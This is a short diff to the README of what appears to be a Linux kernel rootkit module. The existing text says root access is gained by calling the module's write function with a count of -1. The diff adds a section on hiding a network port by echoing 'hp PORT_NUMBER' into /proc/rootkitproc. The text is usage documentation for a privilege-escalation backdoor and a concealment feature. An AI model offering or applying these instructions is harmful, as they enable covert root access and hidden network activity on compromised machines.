@@ -22,7 +22,12 @@ To remove the module:
 
 To be able to get root access:
 ------------------------------
-	After loading the module, Invoke the write function with the last 
+	After loading the module, Invoke the write function with the last
 	parameter (the count) passed as -1
+
+To be able to hide a port:
+------------------------------
+	After loading the module, Isssue the following command
+	echo "hp PORT_NUMBER" > /proc/rootkitproc
 
 -----------------------------------------------------------------------------
